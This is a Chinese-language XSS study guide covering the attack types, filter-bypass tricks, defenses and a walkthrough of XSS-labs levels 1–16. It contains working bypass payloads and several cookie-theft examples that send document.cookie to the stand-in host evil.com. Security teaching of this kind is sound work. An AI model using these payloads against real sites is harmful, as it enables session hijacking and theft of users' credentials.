# XSS 跨站脚本攻击技术指南：从原理到实战

> 一份涵盖XSS原理、三种类型对比、XSS-labs靶场实战、防护方案与心得的系统学习笔记。
> 适合Web安全入门者阅读，同样可作为面试准备的技术展示材料。

---

## 目录

- [第一章：XSS基本原理](#第一章xss基本原理)
- [第二章：常见攻击手法与防护](#第二章常见攻击手法与防护)
- [第三章：XSS-labs前16关解题](#第三章xss-labs前16关解题)
- [第四章：心得体会](#第四章心得体会)

---

## 第一章：XSS基本原理

### 1.1 什么是XSS

XSS（Cross-Site Scripting，跨站脚本攻击）是一种将恶意脚本注入到Web页面中，使其在受害者浏览器中执行的攻击技术。

理解XSS的关键在于一个事实：**浏览器无法区分"来自服务器的合法脚本"和"被攻击者注入的恶意脚本"**。当Web应用将用户输入不加处理地嵌入到HTML页面中时，攻击者提交的 `<script>alert(1)</script>` 就会被浏览器当作合法的JavaScript代码执行。

用一个最经典的例子说明：

```text
正常请求：  http://example.com/search.php?q=hello
后端返回：  <p>搜索结果：hello</p>
浏览器渲染：显示"搜索结果：hello"

恶意请求：  http://example.com/search.php?q=<script>alert(1)</script>
后端返回：  <p>搜索结果：<script>alert(1)</script></p>
浏览器渲染：执行 alert(1)，弹窗！
```

攻击者的输入 `<script>alert(1)</script>` 本应是"数据"（搜索关键词），却被浏览器解读为"代码"（JavaScript）。**这个边界被打破的瞬间，就是XSS发生的时刻。**

上面的例子是反射型XSS，但实际上XSS有三种类型。三者的核心区别在于**恶意脚本到达浏览器的路径不同**。

### 1.2 三种类型对比

| 类型 | 原理 | 触发方式 | 危害程度 |
|------|------|----------|----------|
| **反射型XSS** (Reflected XSS) | 恶意脚本通过URL参数等传入，服务端直接"反射"回响应页面 | 受害者点击构造好的恶意链接 | 中 — 需要用户交互 |
| **存储型XSS** (Stored XSS) | 恶意脚本被存储到数据库，每次访问该页面时从数据库读出并执行 | 受害者访问正常页面即可触发 | **高 — 无需交互，可批量攻击** |
| **DOM型XSS** (DOM-based XSS) | 恶意脚本完全在客户端通过JS操作DOM产生，不经过服务端 | 受害者点击恶意链接 | 中 — 服务端日志无痕迹 |

**反射型 vs 存储型的关键区别**：反射型是"一次性"的——每个受害者都需要点击专属的恶意链接；存储型是"持久化"的——攻击者提交一次恶意脚本，之后所有访问该页面的用户都会中招。

**DOM型 vs 前两者的区别**：DOM型XSS的payload全程不经过服务端，纯粹由前端JS从 `document.location` / `document.referrer` 等来源取值后写入DOM。因此服务端访问日志中看不到任何攻击痕迹，这也是它难以检测的原因。

### 1.3 产生原因

XSS的根本原因归结为两点：**将不可信数据拼入HTML页面**是直接原因，**未做输出编码**是深层原因。

```php
// 反射型XSS — 不安全的写法
$keyword = $_GET['q'];
echo "<p>搜索结果：" . $keyword . "</p>";
// q=<script>alert(1)</script> → XSS发生

// 存储型XSS — 不安全的写法
$comment = $_POST['comment'];
mysqli_query($conn, "INSERT INTO comments (content) VALUES ('$comment')");
// 之后读取并直接输出 → XSS在所有人访问时触发
```

```javascript
// DOM型XSS — 不安全的写法
var keyword = location.hash.substring(1);
document.getElementById("result").innerHTML = keyword;
// #<img/src=x/onerror=alert(1)> → 直接写入innerHTML导致XSS
```

三种类型的根因是相通的：**数据与代码的边界没有被正确隔离**。

### 1.4 危害链

XSS的危害同样是阶梯式的——弹窗只是最基本的验证手段，真正的威胁远不止于此：

```
┌─────────────────────────────────────────────────────────┐
│  弹窗验证                                              │
│  <script>alert(1)</script>                              │
│        ↓                                                │
│  窃取 Cookie / Session                                  │
│  <script>new Image().src='http://evil.com?c='+document.cookie</script> │
│        ↓                                                │
│  钓鱼攻击                                              │
│  注入伪造登录表单，在目标域名下诱导用户输入密码           │
│        ↓                                                │
│  蠕虫传播                                              │
│  XSS + AJAX 自动转发/感染（如2005年Samy蠕虫，24小时感染百万用户）│
│        ↓                                                │
│  浏览器漏洞利用 → 控制受害者主机                         │
└─────────────────────────────────────────────────────────┘
```

需要特别注意：XSS在OWASP Top 10中长期位列前五。与SQL注入不同——SQL注入攻击的是**服务端数据库**，XSS攻击的是**客户端/用户**。但正因为它面向用户，在钓鱼、社工、蠕虫传播等场景中危害极大。

---

## 第二章：常见攻击手法与防护

### 2.1 三种类型的攻击实战

#### 反射型XSS

构造恶意链接诱导受害者点击是最常见的利用方式：

```html
<!-- 搜索框反射型XSS -->
http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>

<!-- 经过URL编码后更具欺骗性 -->
http://target.com/search?q=%3Cscript%3E...%3C%2Fscript%3E
```

攻击者通常配合短网址服务或钓鱼邮件发送编码后的链接。

#### 存储型XSS

评论区、留言板、用户资料页是最常见的存储型XSS入口：

```html
<!-- 在评论区提交 -->
评论内容：<script>
  var img = new Image();
  img.src = 'http://evil.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>

<!-- 之后每个访问该页面的用户Cookie都会被发送到攻击者服务器 -->
```

存储在数据库中的恶意脚本被反复读取输出，**这是危害最大的XSS形式**。

#### DOM型XSS

纯前端漏洞，攻击面包括 `location.hash`、`document.referrer`、`postMessage` 等：

```html
<!-- 页面上的JS代码 -->
<script>
  var url = location.hash.substring(1);
  document.getElementById("content").innerHTML = url;
</script>

<!-- 攻击 -->
http://target.com/page#<img/src=x/onerror=alert(1)>
```

`innerHTML`、`document.write()`、`eval()` 都是DOM型XSS的高风险API。

### 2.2 常见绕过技巧

XSS的绕过本质上是**和过滤规则的对抗**。下面是最常见的四类绕过手法：

#### 大小写绕过

```html
<!-- 过滤了小写 on 开头的事件 -->
<input value="" onclick=alert(1)>     <!-- 被拦截 -->

<!-- 改用大写 -->
<input value="" Onclick=alert(1)>     <!-- 某些过滤规则区分大小写，成功绕过 -->
<input value="" ONCLICK=alert(1)>     <!-- 全大写同样可行 -->
```

> XSS-labs Level 6/7 都会遇到此情况，记住 `On` 就是最简单有效的绕过。

#### 双写绕过

```html
<!-- 过滤了 script 关键字（替换为空） -->
<script>alert(1)</script>             <!-- 被替换为空 -->

<!-- 双写绕过 -->
<scrscriptipt>alert(1)</scrscriptipt>
<!-- 过滤掉中间的 script 后，外层拼在一起恢复为 <script> 和 </script> -->
```

#### 编码绕过

这是最需要掌握的一类绕过，涉及三种编码体系：

| 编码类型 | 语法 | 示例 |
|----------|------|------|
| HTML实体编码 | `&#ASCII码;` | `&#106;` → `j` |
| URL编码 | `%十六进制` | `%3C` → `<` |
| JS Unicode编码 | `\xHH` 或 `\uHHHH` | `\x3c` → `<` |

```html
<!-- 过滤 script 关键字 → 改用 HTML 实体编码 -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>
<!-- 浏览器解析后等价于：javascript:alert(1) -->

<!-- URL中的 < 和 > 被编码 -->
%3Cscript%3Ealert(1)%3C/script%3E
```

#### 替代语法绕过

```html
<!-- 空格被过滤 → 用 / 替代 -->
<img/src=x/onerror=alert(1)>          <!-- 正常语法：<img src=x onerror=...> -->
<!-- / 在HTML标签中可以作为属性分隔符 -->

<!-- on 事件被过滤 → 用其他事件 -->
<svg/onload=alert(1)>                 <!-- SVG标签的onload事件 -->
<body onload=alert(1)>                <!-- body的onload事件 -->
<input onfocus=alert(1) autofocus>    <!-- onfocus + 自动聚焦 -->
```

### 2.3 防护方法

XSS防护是**三层防线**：输出编码是根本，CSP+HttpOnly削减危害，XSS Filter做最终兜底。

#### 第一层：输出编码（根本）

根据**输出上下文**选择不同的编码方式，这是XSS防护的黄金法则：

| 输出上下文 | 编码方式 | 示例 |
|-----------|----------|------|
| HTML文本内容 | HTML实体编码 | `<` → `&lt;` `>` → `&gt;` |
| HTML属性值 | HTML实体编码 + 引号 | 始终用双引号包裹属性值 |
| JavaScript中 | `\xHH` 或 JSON.stringify | 避免将用户输入直接拼入 `<script>` |
| URL中 | URL编码 | `encodeURIComponent()` |
| CSS中 | CSS编码 | 避免将用户输入用于CSS |

```php
// PHP：根据上下文选择编码函数
echo htmlspecialchars($keyword, ENT_QUOTES, 'UTF-8');        // HTML文本
echo json_encode($data, JSON_HEX_TAG | JSON_HEX_AMP);        // JS中
```

```javascript
// 前端：textContent 替代 innerHTML（最安全的实践）
element.textContent = userInput;         // 安全 — 不会解析HTML标签
element.innerHTML = userInput;           // 危险 — 会解析HTML标签

// 如果必须使用 innerHTML，先用 DOMPurify 清洗
element.innerHTML = DOMPurify.sanitize(userInput);
```

#### 第二层：架构层防护（削减攻击面）

**HttpOnly Cookie** — 让JS无法读取Cookie，即使XSS成功也偷不走会话令牌：

```
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
```

**CSP（Content Security Policy）** — 白名单限制可执行的脚本来源：

```http
Content-Security-Policy: script-src 'self'; object-src 'none'; base-uri 'self'
```

这条CSP规则的含义：只允许从同源加载脚本，禁止 `<object>` 标签，限制 `<base>` 标签。

CSP无法防止XSS发生，但能极大削减XSS成功后的利用空间。配合 `report-uri` 还能实现攻击监控。

#### 第三层：流程层防护（兜底）

- **安全扫描**：将 OWASP ZAP 等工具集成到CI/CD，每次上线前自动化扫描
- **代码审计关键词**：搜索 `innerHTML`、`document.write()`、`eval()`、`.html()`
- **前端安全规范**：团队统一使用 `textContent`、避免直接操作HTML字符串

### 2.4 Java / Spring Boot 防护要点

作为Java后端开发者，以下防护机制需要熟悉：

**Thymeleaf 模板引擎**：默认使用 `th:text` 进行HTML实体编码，无需额外处理：

```html
<!-- 安全：th:text 自动转义 -->
<p th:text="${userInput}"></p>

<!-- 危险：th:utext 不转义，仅在确保数据安全时使用 -->
<p th:utext="${trustedHtml}"></p>
```

**JSP**：使用 `<c:out>` 标签自动转义，或使用 `fn:escapeXml()` 函数：

```jsp
<%-- 安全 --%>
<c:out value="${userInput}" />

<%-- 危险 — 不要这样写 --%>
<%= request.getParameter("q") %>
```

**Spring Boot 全局防护**：可配置 `X-XSS-Protection` 响应头、集成 `Jsoup` 白名单清洗：

```java
// 使用 Jsoup 白名单清洗用户输入的HTML
String safe = Jsoup.clean(userInput, Whitelist.basic());
```

| 防护层级 | 一句话要点 |
|----------|-----------|
| 输出编码 | 根据上下文选编码方式，htmlspecialchars / textContent / th:text |
| CSP + HttpOnly | 就算XSS成功，偷不走Cookie，调不了外部脚本 |
| 规范+审计 | 代码会变，扫描要持续跑，innerHTML 是最大的红旗 |

---

## 第三章：XSS-labs前16关解题

> XSS-labs 和 sqli-labs 同为安全靶场经典，覆盖了从基础反射型到绕过过滤、HTTP头注入、AngularJS框架XSS的渐进式训练场景。

### 3.0 前置知识

在开始解题之前，需要掌握的HTML/JS基础：

**常用XSS事件属性：**

| 事件属性 | 触发时机 | 常用场景 |
|----------|----------|----------|
| `onclick` | 元素被点击 | 需要用户交互时 |
| `onerror` | 资源加载失败 | `<img src=x onerror=...>` — 无需交互 |
| `onload` | 元素加载完成 | `<body onload=...>` `<svg onload=...>` |
| `onfocus` | 元素获得焦点 | 配合 `autofocus` 属性自动触发 |
| `onmouseover` | 鼠标悬停 | 需要用户鼠标经过元素 |

**XSS payload的构造思路：**

```
确认输出位置 → 判断上下文（HTML文本/属性/JS/URL） → 选择闭合方式 → 构造完整HTML标签+事件 → 遇到过滤就绕过
```

### 3.1 纯文本回显（Level 1）

Level 1 没有任何过滤，是最简单的反射型XSS：

**源码分析：**

```php
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户" . $str . "</h2>";
```

用户输入直接拼入 `<h2>` 标签的文本内容中。

**Payload：**

```html
<script>alert(1)</script>
```

页面变为 `<h2>欢迎用户<script>alert(1)</script></h2>`，浏览器解析到 `<script>` 标签后直接执行。

> 这是唯一不需要任何绕过技巧的一关。

### 3.2 属性值闭合（Level 2 ~ Level 7）

从 Level 2 开始，注入点转移到了HTML标签的属性值中。核心思路变为：**先闭合当前属性，再注入自己的事件属性**。

#### Level 2：双引号属性值闭合

**源码分析：**

```php
echo "<input name=keyword value=\"" . $str . "\">";
```

输出到 `<input>` 标签的 `value` 属性中。如果直接输入 `<script>alert(1)</script>`，页面会变成：

```html
<input name=keyword value="<script>alert(1)</script>">
```

浏览器将整个 `<script>` 当作 `value` 属性的字符串值，不会执行。

**Payload：**

```html
" onclick=alert(1)
```

拼接后：

```html
<input name=keyword value="" onclick=alert(1)">
<!--                       ↑ 闭合value    ↑ 注入点击事件 -->
```

> Level 3 只是单引号闭合（`' onclick=alert(1)`），Level 4 是双引号但 `<>` 被编码，同样用 `" onclick=alert(1)` 即可。

#### Level 5 ~ Level 7：事件属性被过滤

Level 5 将 `on` 替换为 `o_n`，Level 6 过滤了 `on` 和 `href` 等关键字。

**绕过策略：**

| 关卡 | 过滤规则 | Payload | 绕过原理 |
|------|----------|---------|----------|
| Level 5 | `on` → `o_n` | `<a href="javascript:alert(1)">click</a>` | 换思路，不用事件属性，改用 `<a>` 标签的 `javascript:` 伪协议 |
| Level 6 | 过滤 `on`、`href` 等 | `" Onclick=alert(1)` | 大写 `On` 绕过小写关键字匹配 |
| Level 7 | 过滤 `on`（所有大小写） | `" oonnclick=alert(1)` | 双写思路：如果过滤是替换为空，`OONN` → 过滤 → `ON` |

> **面试提示**：面试官若问"on被过滤了怎么办"，先答**大小写**（`On`/`ON`），再答**换思路**（用 `<a href="javascript:">` 等其他标签），最后答**其他事件**（`onfocus` + `autofocus` 无需点击）。

### 3.3 href 伪协议 + HTML 实体编码（Level 8 ~ Level 9）

这两关将注入点换到了 `<a>` 标签的 `href` 属性中。

#### Level 8：script 关键字被替换

**源码分析：**

```php
$str = strtolower($_GET["name"]);
$str = str_replace("script", "scr_ipt", $str);
echo "<a href=\"" . $str . "\">友情链接</a>";
```

直接输入 `javascript:alert(1)` 会被替换为 `javascr_ipt:alert(1)`，链接失效。

**Payload：**

```html
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)
```

`&#106;` = `j`, `&#97;` = `a`, `&#118;` = `v`, `&#97;` = `a`, `&#115;` = `s`, `&#99;` = `c`, `&#114;` = `r`, `&#105;` = `i`, `&#112;` = `p`, `&#116;` = `t` —— 拼起来就是 `javascript`。

> 这是用户卡得最久的一关。关键理解：后端过滤的是字符串 `script`，但浏览器在解析 `href` 属性时会对HTML实体解码，解码后才得到 `javascript:`，此时已经绕过后端检查。

#### Level 9：增加了URL合法性校验

**额外逻辑**：检查 `href` 值是否包含 `http://`。

**Payload：**

```html
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)//http://
```

在 `javascript:` 伪协议后添加 `//http://`，`//` 在JS中是单行注释，`http://` 被注释掉但通过了URL检查。

> 核心技巧：利用JS注释 `//` 或 `/* */` 吃掉多余的校验内容。

---

### 3.4 隐藏参数注入（Level 10）

Level 10 的回显位置藏在了 `<input type="hidden">` 中。

**源码分析：**

页面源码中有一个隐藏的 `<input>` 标签，`name="t_sort"`：

```html
<input name="t_sort" type="hidden" value="">
```

URL参数 `t_sort` 的值被拼入 `value` 属性。

**Payload：**

```
?t_sort=" onclick=alert(1)" type="text
```

拼接后：

```html
<input name="t_sort" type="hidden" value="" onclick=alert(1)" type="text">
```

两个关键技巧：
- `" ` 闭合 value → 加 `onclick` 事件 → 用另一个 `"` 闭合属性
- `type="text"` 将 hidden 覆盖为 text → 输入框变为可见，可以点击触发

> **盲测思路**：不是所有注入点都肉眼可见。F12 审查元素，逐个找 `<input>` 标签的 `name` 属性值，把这些参数名一个个加到URL上测试。

### 3.5 HTTP头注入（Level 11 ~ Level 13）

这三关将注入位置从URL参数转移到了HTTP请求头。核心理解：**服务端读取HTTP头并输出到HTML时，如果未做过滤，HTTP头就成了注入通道。**

**源码分析（通用模式）：**

```php
$referer = $_SERVER['HTTP_REFERER'];  // 或 HTTP_USER_AGENT / HTTP_COOKIE
echo "<input value=\"" . $referer . "\">";
```

| 关卡 | 注入头 | Payload | 工具 |
|------|--------|---------|------|
| Level 11 | `Referer` | `" onclick=alert(1)" type="text` | Burp Suite / 浏览器F12修改Header |
| Level 12 | `User-Agent` | `" onclick=alert(1)" type="text` | 同上 |
| Level 13 | `Cookie` | `user=" onclick=alert(1)" type="text` | 浏览器F12 Application面板修改Cookie |

**统一payload思路**：和 Level 10 完全一致——闭合 `value` 属性 → 注入 `onclick` 事件 → `type="text"` 让 input 可见。

> **面试提示**：HTTP头注入是很多入门者容易忽略的攻击面。面试官问"除了GET/POST参数，还有哪些XSS注入点？"→ 答：**Cookie、Referer、User-Agent、X-Forwarded-For**。

### 3.6 AngularJS 框架XSS（Level 15）

Level 15 使用了 AngularJS 的 `ng-include` 指令动态加载页面片段，引入了一种完全不同类型的XSS。

**源码分析：**

```html
<div ng-app="" ng-include="'src'">
```

`ng-include` 会根据 `src` 参数加载外部HTML片段。注意：`src` 是参数名，不是URL路径。

**三个坑：**

1. **参数名**：是 `src` 而不是其他名字，通过F12查看源码中的 `ng-include="'src'"` 确认
2. **嵌套 `?` 需要编码**：URL中 `?` 是参数分隔符，如果 payload 中有第二个 `?`（如 `level1.php?name=...`），必须编码为 `%3F`
3. **AngularJS 语法**：`ng-include` 加载的是HTML片段，不需要 Angular 表达式

**Payload：**

```
?src=level1.php?name=<svg onload=alert(1)>
```

经过URL编码后：

```
?src=level1.php%3Fname=%3Csvg%20onload%3Dalert(1)%3E
```

思路：通过 `ng-include` 加载 Level 1 的页面，并在 `name` 参数中传入XSS payload。Level 1 无任何过滤，`<svg onload=alert(1)>` 直接触发。

> 面试中大概率不考框架级XSS，但可以提一句：AngularJS 的 `{{constructor.constructor('alert(1)')()}}` 是经典的沙箱逃逸 payload。

### 3.7 空格过滤绕过（Level 16）

Level 16 将空格编码为 `&nbsp;`，导致 `<img src=x onerror=alert(1)>` 中空格全部变成不可分割空格，标签解析失败。

**Payload：**

```html
<img/src=x/onerror=alert(1)>
```

HTML标签中 `/` 可以作为属性分隔符，替代空格。这是绕过空格过滤最干净的方案。

> 其他替代方案：`%0a`（换行符）、`%0d`（回车符）、`%09`（制表符）也可以在某些场景作为空白分隔。

### 3.8 第三章节总结

#### 绕过姿势汇总表

| 被过滤内容 | 关联关卡 | 绕过手法 |
|-----------|----------|----------|
| `<>` 被编码 | Level 4 | 不用新标签，用属性闭合 `" onclick=` |
| `on` 事件属性 | Level 5~7 | 大小写 `On`/`ON`；换思路用 `<a href="javascript:">` 伪协议 |
| `script` 关键字 | Level 8 | HTML实体编码 `&#106;&#97;&#118;...` |
| `script` + URL校验 | Level 9 | 实体编码 + `//http://` 注释吃掉校验内容 |
| 参数藏起来 | Level 10 | F12找隐藏input的name属性 |
| 注入点不在URL参数 | Level 11~13 | HTTP头注入：Referer / UA / Cookie |
| AngularJS框架 | Level 15 | `ng-include` 加载外部页面 + 参数编码 |
| 空格过滤 | Level 16 | `/` 替代空格，或用 `%0a` |

#### 关卡速查

| 关卡 | 上下文 | 一句话payload |
|------|--------|---------------|
| 1 | 纯文本回显 | `<script>alert(1)</script>` |
| 2 | `<input value="">` | `" onclick=alert(1)` |
| 3 | `<input value=''>` | `' onclick=alert(1)` |
| 4 | `<input value="">` `<>`编码 | `" onclick=alert(1)` |
| 5 | `<input value="">` `on`→`o_n` | `<a href="javascript:alert(1)">click</a>` |
| 6 | 过滤 `on`/`href` | `" Onclick=alert(1)` |
| 7 | 过滤 `on` | `" ONclick=alert(1)` |
| 8 | `<a href="">` `script`→`scr_ipt` | `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)` |
| 9 | Level 8 + URL校验 | 同上 + `//http://` |
| 10 | 隐藏 `<input type="hidden">` | `?t_sort=" onclick=alert(1)" type="text` |
| 11 | Referer头 → `<input>` | `Referer: " onclick=alert(1)" type="text` |
| 12 | User-Agent头 | `UA: " onclick=alert(1)" type="text` |
| 13 | Cookie头 | `user=" onclick=alert(1)" type="text` |
| 15 | AngularJS ng-include | `?src=level1.php%3Fname=%3Csvg%20onload%3Dalert(1)%3E` |
| 16 | 空格 → `&nbsp;` | `<img/src=x/onerror=alert(1)>` |

#### 薄弱点提示

| 短板 | 原因 | 怎么补 |
|------|------|--------|
| 编码绕过不熟 | 分不清HTML实体/URL/JS Unicode的适用场景 | 记住：HTML中 `&#ASCII;`、URL中 `%HH`、JS中 `\xHH` |
| 事件属性记不住 | onload/onerror作用域不清楚 | 背5个：`onclick`(点击) `onerror`(报错) `onload`(加载) `onfocus`(聚焦) `onmouseover`(悬停) |
| 不同数据来源 | 习惯了只在URL参数找注入点 | 盲测顺序：URL参数 → POST表单 → HTTP头(Referer/UA/Cookie) → 隐藏参数 |

---

## 第四章：心得体会

### 4.1 编码绕过的学习曲线

SQL注入刷完后转XSS，第一感觉是"简单"——不就是 `<script>alert(1)</script>` 吗？结果从 Level 5 开始就被教做人了。

回顾下来，卡的最久的永远是**编码绕过**。SQL注入中也有编码问题，但更多是URL编码和空格替代；XSS中的编码维度多了两层——HTML实体编码和JS Unicode编码。Level 8 的 `&#106;&#97;&#118;...` 让我第一次意识到：**浏览器在渲染HTML时会自动解码HTML实体，而后端的过滤逻辑在编码之前执行**——这个时间差就是编码绕过的核心。

三种编码的适用边界花了不少时间才厘清：
- 在HTML标签/属性值中 → 用HTML实体编码（`&#ASCII;`）
- 在URL参数中 → 用URL编码（`%HH`）
- 在 `<script>` 标签内的JS代码中 → 用 `\xHH` 或 `\uHHHH`

记这个没用，要在不同上下文中想清楚"此时此刻，数据经过了哪几层解码"。

### 4.2 不同数据来源的盲测思维

Level 10 的隐藏参数是思维转折点——之前9关都在URL参数上找注入，给你一个 `t_sort` 的 `type="hidden"` 就完全忽略了。后来养成了一个习惯：打开F12 → 审查元素 → 搜索 `<input`，逐个找 `name` 属性，把这些参数名挨个加到URL上试。

到 Level 11~13 时进一步扩展了认知：**用户输入不只是URL参数和表单，还包括每一个HTTP请求头**。Referer、User-Agent、Cookie——只要服务端读取并输出了，就是潜在的注入通道。

现在看任何一个Web页面，脑子里会自动跑这个检查顺序：URL参数有没有回显？→ POST表单有没有回显？→ 修改HTTP头看看有没有回显？→ F12找找有没有隐藏参数？这种盲测流程比具体的payload更有长期价值。

### 4.3 攻防一体的验证

SQL注入那篇写过的感悟在这里同样成立：刷完16关后写代码，凡是用到 `innerHTML` 的地方都会心里一紧。`textContent` 和 `innerHTML` 的区别不只是API选择，而是"要不要信任这段字符串能当代码执行"的安全决策。

XSS比SQL注入更贴近前端，也更容易在日常开发中遇到。一个评论区、一个搜索框、一段用户签名——只要有一个输出点没做编码，就可能被利用。

---

> **致谢**：感谢 XSS-labs 提供的开源靶场。
>
> **声明**：本文所有技术内容仅供学习研究，请勿用于非法用途。

---

*作者：熊志博 | 2026年7月*
